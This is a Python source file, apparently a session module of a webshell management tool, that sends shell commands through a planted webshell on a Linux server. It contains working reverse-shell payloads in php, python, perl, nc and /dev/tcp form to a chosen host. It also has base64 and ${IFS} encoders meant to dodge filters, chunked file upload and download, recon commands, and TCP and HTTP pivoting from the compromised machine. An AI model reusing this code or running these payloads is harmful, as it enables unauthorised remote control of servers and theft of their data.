import asyncio
import typing as t
import logging
import base64
import shlex
import hashlib
import httpx
from urllib.parse import quote

from ..core import exceptions

from ..core.base import (
    register_session,
    Option,
    OptionGroup,
    DirectoryEntry,
    BasicInfoEntry,
    HttpResponseDict,
    ProcessProtocol,
    get_http_client,
)

from ..utils.random_data import random_string
from ..utils.tools import user_json_loads

logger = logging.getLogger("core.sessions.linux_cmd_oneliner")

WRAPPER_CODE = """
echo -n "{start1}""{start2}";
({code}) {decoder}
echo {stop}
"""

UPLOAD_FILE_CHUNK_CODE = """
file=`mktemp`
echo {chunk_b64} | base64 -d > $file
echo DONE "$file"
""".strip()

UPLOAD_FILE_MERGE_CODE = """
cat {files} > {filepath}
rm {files}
"""

UPLOAD_FILE_CHECK_CODE = """
which md5sum >/dev/null || echo no_md5sum
md5sum {filepath} 
"""

DOWNLOAD_FILE_CHUNK_CODE = """
tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED
"""

GET_BASICINFO_CODE = """
for cmd in {cmds}
do
  echo "start$cmd|"$($cmd | base64 -w 0)"stop"
done
"""

REVERSE_SHELL_PAYLOAD = """
if command -v php > /dev/null 2>&1; then
  php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
  exit;
fi

if command -v python > /dev/null 2>&1; then
  python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{host}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  exit;
fi

if command -v perl > /dev/null 2>&1; then
  perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  exit;
fi

if command -v nc > /dev/null 2>&1; then
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f
  exit;
fi

if command -v sh > /dev/null 2>&1; then
  /bin/sh -i >& /dev/tcp/{host}/{port} 0>&1
  exit;
fi
"""


def reverse_shell_payload(host: str, port: int):
    payload = REVERSE_SHELL_PAYLOAD.replace("{host}", host).replace("{port}", str(port))
    payload = base64.b64encode(payload.encode()).decode()
    payload = f"echo {payload} | base64 -d | sh"
    return payload


def shell_command(args: t.List[str]):
    """转译命令或命令参数"""
    return " ".join(shlex.quote(arg) for arg in args)


def parse_file_permission(perm: str):
    result = ""
    for i in range(0, 9, 3):
        part = perm[i : i + 3]
        digit_bin = "".join("0" if c == "-" else "1" for c in part)
        result += str(int(digit_bin, 2))
    return result


class LinuxCmdProcess:
    def __init__(
        self,
        pid: str,
        proc_dir: str,
        submit_fn: t.Callable,
    ):
        self._pid = pid
        self._proc_dir = proc_dir
        self._submit = submit_fn
        self._stdout_offset: int = 0
        self._stderr_offset: int = 0

    @property
    def pid(self) -> t.Union[int, str]:
        return self._pid

    async def send_signal(self, sig: int) -> None:
        pid_q = shlex.quote(str(self._pid))
        await self._submit(
            f"kill -{sig} {pid_q} 2>/dev/null; "
            f"pkill -{sig} -P {pid_q} 2>/dev/null; true"
        )

    async def write_stdin(self, data: bytes) -> None:
        b64 = base64.b64encode(data).decode()
        stdin_path = shlex.quote(f"{self._proc_dir}/stdin")
        await self._submit(f"printf '%s' {b64} | base64 -d >> {stdin_path}")

    async def read_stdout_stderr(self) -> t.Tuple[bytes, bytes]:
        stdout_path = shlex.quote(f"{self._proc_dir}/stdout")
        stderr_path = shlex.quote(f"{self._proc_dir}/stderr")

        stdout_data = b""
        out_cmd = (
            f"tail -c +{self._stdout_offset + 1} {stdout_path}"
            " 2>/dev/null | base64 -w0"
        )
        out_b64 = (await self._submit(out_cmd)).strip()
        if out_b64:
            stdout_data = base64.b64decode(out_b64)
            self._stdout_offset += len(stdout_data)

        stderr_data = b""
        err_cmd = (
            f"tail -c +{self._stderr_offset + 1} {stderr_path}"
            " 2>/dev/null | base64 -w0"
        )
        err_b64 = (await self._submit(err_cmd)).strip()
        if err_b64:
            stderr_data = base64.b64decode(err_b64)
            self._stderr_offset += len(stderr_data)

        return stdout_data, stderr_data

    async def wait(self, timeout: float) -> t.Union[int, None]:
        loop = asyncio.get_event_loop()
        deadline = loop.time() + timeout
        rc_path = shlex.quote(f"{self._proc_dir}/rc")

        while True:
            rc_output = (
                await self._submit(f"test -f {rc_path} && cat {rc_path} || echo NONE")
            ).strip()
            if rc_output != "NONE":
                return int(rc_output) if rc_output.isdigit() else -1

            if loop.time() >= deadline:
                return None

            await asyncio.sleep(0.5)


@register_session
class LinuxCmdOneLiner:
    session_type = "LINUX_CMD_ONELINER"
    readable_name = "Linux命令执行"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                Option(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="cmd",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password_method",
                    name="密码传参方式",
                    type="select",
                    placeholder="POST",
                    default_value="POST",
                    alternatives=[
                        {"name": "POST", "value": "POST"},
                        {"name": "GET", "value": "GET"},
                        {"name": "Header", "value": "Header"},
                    ],
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                Option(
                    id="encoder",
                    name="命令编码器",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64_quote", "value": "base64_quote"},
                        {"name": "base64_ifs", "value": "base64_ifs"},
                    ],
                ),
                Option(
                    id="decoder",
                    name="解码器",
                    type="select",
                    placeholder="raw",
                    default_value="raw",
                    alternatives=[
                        {"name": "raw", "value": "raw"},
                        {"name": "base64", "value": "base64"},
                    ],
                ),
                Option(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="updownload_chunk_size",
                    name="文件上传下载分块大小",
                    type="text",
                    placeholder="文件上传下载的分块大小，单位为字节，建议在1KB-1024KB之间",
                    default_value="1024",
                    alternatives=None,
                ),
                Option(
                    id="updownload_max_coroutine",
                    name="文件上传下载并发量",
                    type="text",
                    placeholder="控制文件上传和下载时的最大协程数量",
                    default_value="4",
                    alternatives=None,
                ),
                Option(
                    id="extra_post_params",
                    name="额外的POST参数",
                    type="text",
                    placeholder='保存着额外参数的JSON对象，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                Option(
                    id="extra_headers",
                    name="额外的headers",
                    type="text",
                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                Option(
                    id="extra_headers",
                    name="额外的headers",
                    type="text",
                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        # super().__init__(session_conn)
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.password_method = session_conn.get("password_method", "POST").upper()
        self.https_verify = session_conn.get("https_verify", False)

        self.params = user_json_loads(session_conn.get("extra_get_params", "{}"), dict)
        self.data = user_json_loads(session_conn.get("extra_post_params", "{}"), dict)
        self.headers = user_json_loads(
            session_conn.get("extra_headers", "null"), (dict, type(None))
        )

        self.decoder = session_conn.get("decoder", "raw")
        self.encoder = session_conn.get("encoder", "raw")

        self.client = get_http_client(verify=self.https_verify)

        # for upload file and download file
        self.chunk_size = int(session_conn.get("updownload_chunk_size", 1024))
        self.max_coro = int(session_conn.get("updownload_max_coroutine", 4))

    async def execute_cmd(self, cmd: str):
        return await self.submit(cmd)

    async def test_usablility(self):
        toprint = random_string(12)
        return toprint in (await self.submit(["echo", toprint]))

    async def get_pwd(self):
        return (await self.submit("pwd")).strip()

    async def create_process(
        self,
        argv: t.List[str],
        overrides_env: t.Union[t.Dict[str, str], None] = None,
    ) -> LinuxCmdProcess:
        proc_dir = (await self.submit("mktemp -d")).strip()
        await self.submit(f"mkfifo {shlex.quote(proc_dir + '/stdin')}")

        env_prefix = ""
        if overrides_env:
            env_parts = ["env"] + [
                f"{shlex.quote(k)}={shlex.quote(v)}" for k, v in overrides_env.items()
            ]
            env_prefix = " ".join(env_parts) + " "

        cmd = shell_command(argv)
        stdin_path = shlex.quote(f"{proc_dir}/stdin")
        stdout_path = shlex.quote(f"{proc_dir}/stdout")
        stderr_path = shlex.quote(f"{proc_dir}/stderr")
        rc_path = shlex.quote(f"{proc_dir}/rc")

        setup_cmd = (
            f"(exec 0<>{stdin_path}; exec 1>{stdout_path}; "
            f"exec 2>{stderr_path}; {env_prefix}{cmd}; "
            f"echo $? > {rc_path}) & echo $!"
        )

        output = (await self.submit(setup_cmd)).strip()
        pid = output.strip()

        return LinuxCmdProcess(pid=pid, proc_dir=proc_dir, submit_fn=self.submit)

    async def _list_dir(self, dir_path: str) -> t.Union[t.List[DirectoryEntry], None]:
        # 不仅列出文件夹，在给定的是文件时给出文件的详细信息

        # yes, we are parsing output of `ls`, although we shoudn't
        command_output = await self.submit(
            shell_command(["ls", "-la", dir_path]) + " && echo finished"
        )
        result = []
        if "finished" not in command_output:
            return None
        for line in command_output.splitlines():
            parts = line.split(maxsplit=8)
            if len(parts) < 9:
                continue
            perm = parts[0]
            filesize = parts[4]
            name = parts[8]  # it would be `aaa -> bbb` when it is symlink

            try:
                filesize = int(filesize)
            except Exception as exc:
                raise exceptions.FileError("无法解析文件大小") from exc

            filetype = perm[0]
            perm = parse_file_permission(perm[1:10])
            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(
                filetype, "unknown"
            )
            if filetype == "link":
                filetype = "link-dir" if name.endswith("/") else "link-file"
                name = name.split(" ->")[0]
            result.append(
                DirectoryEntry(
                    name=name,
                    permission=perm,
                    filesize=int(filesize),
                    entry_type=filetype,
                )
            )
        return result

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        result = await self._list_dir(dir_path)
        if result:
            return result
        return [
            DirectoryEntry(name="..", permission="555", filesize=-1, entry_type="dir")
        ]

    async def mkdir(self, dir_path: str):
        result = await self.submit(
            shell_command(["mkdir", dir_path]) + " && echo finished"
        )
        if result.strip() != "finished":
            raise exceptions.FileError("创建文件夹失败")

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200):
        ls_result = await self.list_dir(filepath)
        if not ls_result or ls_result[0].filesize > max_size:
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        content_b64 = await self.submit(["base64", "-w", "0", filepath])
        return base64.b64decode(content_b64)

    async def put_file_contents(self, filepath: str, content: bytes):
        content_b64 = base64.b64encode(content).decode()
        cmd = (
            f"{shell_command(['echo', content_b64])} | "
            + f"base64 -d > {shlex.quote(filepath)} && echo finished"
        )
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        content = await self.get_file_contents(filepath)
        text = content.decode("utf-8", errors="replace")
        count = text.count(old_str)
        if replace_strategy is None and count != 1:
            raise exceptions.FileError(f"旧字符串出现了{count}次，不符合恰好一次的要求")
        if count == 0:
            raise exceptions.FileError("在文件中找不到旧字符串")
        if replace_strategy == "once":
            text = text.replace(old_str, new_str, 1)
        else:
            text = text.replace(old_str, new_str)
        await self.put_file_contents(filepath, text.encode("utf-8"))

    async def delete_file(self, filepath: str):
        cmd = shell_command(["rm", filepath]) + " && echo finished"
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def move_file(self, filepath: str, new_filepath: str):
        cmd = shell_command(["mv", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("移动失败")

    async def copy_file(self, filepath: str, new_filepath: str):
        cmd = shell_command(["cp", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("移动失败")

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        result_touch = await self.submit(
            shell_command(["touch", filepath]) + " && echo finished"
        )
        if result_touch.strip() != "finished":
            raise exceptions.FileError("文件上传失败：无法新建文件")

        sem = asyncio.Semaphore(self.max_coro)
        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def upload_chunk(chunk: bytes):
            nonlocal done_coro, done_bytes
            code = UPLOAD_FILE_CHUNK_CODE.format(
                chunk_b64=base64.b64encode(chunk).decode()
            )
            async with sem:
                await asyncio.sleep(0.01)
                result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            result = result.strip()
            if not result.startswith("DONE"):
                raise exceptions.FileError("上传分块失败")

            return result.removeprefix("DONE").strip()

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        code = UPLOAD_FILE_MERGE_CODE.format(
            files=shell_command(uploaded_chunks), filepath=shlex.quote(filepath)
        )
        await self.submit(code)
        checkfile = await self.submit(
            UPLOAD_FILE_CHECK_CODE.format(filepath=shlex.quote(filepath))
        )
        if "no_md5sum" in checkfile:
            return True  # we cannot check it
        if hashlib.md5(content).hexdigest() not in checkfile:
            raise exceptions.FileError("上传失败：MD5验证失败")
        return True

    async def download_file(self, filepath: str, callback=None):
        ls_result = await self.list_dir(filepath)
        if not ls_result:
            raise exceptions.FileError("读取文件大小失败，也许文件不存在？")
        filesize = ls_result[0].filesize

        sem = asyncio.Semaphore(self.max_coro)
        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def download_chunk(offset: int):
            nonlocal done_coro, coros, done_bytes
            # 这里的offset从1开始
            code = DOWNLOAD_FILE_CHUNK_CODE.format(
                offset=offset,
                filepath=shlex.quote(filepath),
                chunk_size=str(chunk_size),
            )
            async with sem:
                await asyncio.sleep(0.01)  # we don't ddos
                result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += chunk_size  # TODO: fix me
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )
            if "#FAILED" in result:
                raise exceptions.FileError("无法读取文件")
            try:
                return base64.b64decode(result.strip())
            except Exception as exc:
                raise exceptions.FileError("无法base64解码分块") from exc

        coros = [download_chunk(i) for i in range(1, filesize + 1, chunk_size)]
        chunks = await asyncio.gather(*coros)
        return b"".join(chunks)

    async def open_reverse_shell(self, host: str, port: int) -> None:
        await self.submit(reverse_shell_payload(host, port))

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        """得到发送字节支持的TCP方法"""
        result = await self.submit(
            "command -v socat >/dev/null 2>&1 && echo HAS_SOCAT; "
            "command -v nc >/dev/null 2>&1 && echo HAS_NC; "
            "command -v base64 >/dev/null 2>&1 && echo HAS_BASE64"
        )
        methods: t.List[str] = []
        if "HAS_SOCAT" in result and "HAS_BASE64" in result:
            methods.append("socat")
        if "HAS_NC" in result and "HAS_BASE64" in result:
            methods.append("nc")
        return methods

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        """把一串字节通过TCP发送到其他机器上，可以指定对应的发送方法"""
        content_b64 = base64.b64encode(content).decode()
        host_q = shlex.quote(host)
        port_str = str(port)

        if send_method is not None:
            methods_to_try = [send_method]
        else:
            methods_to_try = await self.get_send_tcp_support_methods()
            if not methods_to_try:
                raise exceptions.ServerError(
                    "无法发送TCP数据：目标系统没有可用的工具（需要socat或nc及base64）"
                )

        for method in methods_to_try:
            if method == "socat":
                cmd = (
                    f"echo {content_b64} | base64 -d"
                    f" | socat - TCP:{host_q}:{port_str},connect-timeout=5"
                    f" | base64 -w0"
                )
            elif method == "nc":
                cmd = (
                    f"echo {content_b64} | base64 -d"
                    f" | nc -w 5 {host_q} {port_str}"
                    f" | base64 -w0"
                )
            else:
                raise exceptions.UserError(f"未知的TCP发送方法: {method}")

            result = await self.submit(cmd)
            if result.strip():
                return base64.b64decode(result.strip())

        return None

    async def send_http_request(
        self,
        url: str,
        method: str = "GET",
        headers: t.Optional[t.Dict[str, str]] = None,
        params: t.Optional[t.Dict[str, t.Any]] = None,
        data: t.Optional[t.Union[str, bytes]] = None,
    ) -> HttpResponseDict:
        from urllib.parse import urlencode

        curl_check = await self.submit("which curl")
        if not curl_check.strip():
            raise exceptions.TargetError("目标系统未安装curl命令")

        cmd_parts = ["curl", "-s", "-i"]
        cmd_parts.extend(["-X", method])

        if headers:
            for key, value in headers.items():
                cmd_parts.extend(["-H", f"{key}: {value}"])

        full_url = url
        if params:
            full_url = f"{url}?{urlencode(params)}"

        if data is not None:
            if isinstance(data, bytes):
                data_str = base64.b64encode(data).decode()
                cmd_parts.extend(["--data", data_str])
            else:
                cmd_parts.extend(["--data", data])

        cmd_parts.append(full_url)
        cmd_str = " ".join(shlex.quote(part) for part in cmd_parts)
        output = await self.submit(cmd_str)

        lines = output.splitlines()
        if not lines:
            raise exceptions.NetworkError("HTTP请求无响应")

        status_line = lines[0]
        if not status_line.startswith("HTTP/"):
            raise exceptions.NetworkError(f"无效的HTTP响应: {status_line}")
        status_parts = status_line.split()
        if len(status_parts) < 2:
            raise exceptions.NetworkError(f"无法解析状态码: {status_line}")
        status_code = int(status_parts[1])

        headers_dict: t.Dict[str, str] = {}
        body_lines: t.List[str] = []
        in_body = False
        for line in lines[1:]:
            if not in_body:
                if line.strip() == "":
                    in_body = True
                    continue
                if ":" in line:
                    key, value = line.split(":", 1)
                    headers_dict[key.strip()] = value.strip()
            else:
                body_lines.append(line)

        body = "\n".join(body_lines)
        return HttpResponseDict(
            status_code=status_code,
            headers=headers_dict,
            body=body.encode() if body else b"",
        )

    async def get_basicinfo(self):
        # TODO: 多加一点命令
        cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
        info = GET_BASICINFO_CODE.format(cmds=shell_command(cmds))
        result = []
        for line in (await self.submit(info)).splitlines():
            line = line.strip().removeprefix("start").removesuffix("stop")
            if "|" not in line:
                continue
            cmd, output_b64 = line.split("|", maxsplit=1)
            try:
                output = base64.b64decode(output_b64.strip()).decode()
            except Exception:
                continue
            result.append(BasicInfoEntry(key=cmd, value=output))
        return result

    async def submit(self, payload: t.Union[str, t.List[str]]):
        start1, start2, stop = random_string(6), random_string(6), random_string(12)
        # we use f-string here because shell commands normally don't
        # has brackets unlike php code
        code = WRAPPER_CODE.format(
            start1=start1,
            start2=start2,
            code=payload if isinstance(payload, str) else shell_command(payload),
            stop=stop,
            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
        )
        if self.encoder == "base64_quote":
            code = shell_command(
                [
                    "sh",
                    "-c",
                    "echo "
                    + base64.b64encode(code.encode()).decode()
                    + "|base64 -d|sh",
                ]
            )
        elif self.encoder == "base64_ifs":
            code = (
                "sh -c echo${IFS}"
                + base64.b64encode(code.encode()).decode()
                + "|base64${IFS}-d|sh"
            )
        elif self.encoder == "raw":
            pass
        else:
            raise exceptions.UserError("未知encoder: " + self.encoder)
        status_code, html = await self.submit_http(code)
        if status_code == 404:
            raise exceptions.TargetUnreachable(
                f"状态码404, 没有这个webshell: {status_code}"
            )
        if (start1 + start2) not in html:
            logger.debug(f"HTML response: {html}")
            raise exceptions.PayloadOutputError(
                "找不到输出文本的开头，也许webshell没有执行代码？"
            )
        html_afterstarted = html[html.index(start1 + start2) + len(start1 + start2) :]
        if stop not in html_afterstarted:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的结尾，也许webshell没有执行代码？"
            )
        todecode = html_afterstarted[: html_afterstarted.index(stop)].removeprefix("\n")

        if self.decoder == "base64":
            # TODO: allow user defind target encoding
            return base64.b64decode(todecode).decode()
        if self.decoder == "raw":
            return todecode
        else:
            raise exceptions.UserError("未知Decoder: " + self.decoder)

    async def submit_http(self, payload: t.Union[str, bytes]):
        try:
            kwargs = {
                "params": self.params.copy(),
                "headers": {"Connection": "close"},
                "data": self.data.copy(),
            }
            if self.password_method in ["GET", "HEAD"]:
                kwargs["params"][self.password] = payload
            elif self.password_method == "HEADER":
                kwargs["headers"][
                    self.password
                ] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
            else:
                kwargs["data"][self.password] = payload
            response = await self.client.request(
                method=(
                    "POST" if self.password_method == "HEADER" else self.password_method
                ),
                url=self.url,
                **kwargs,
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc
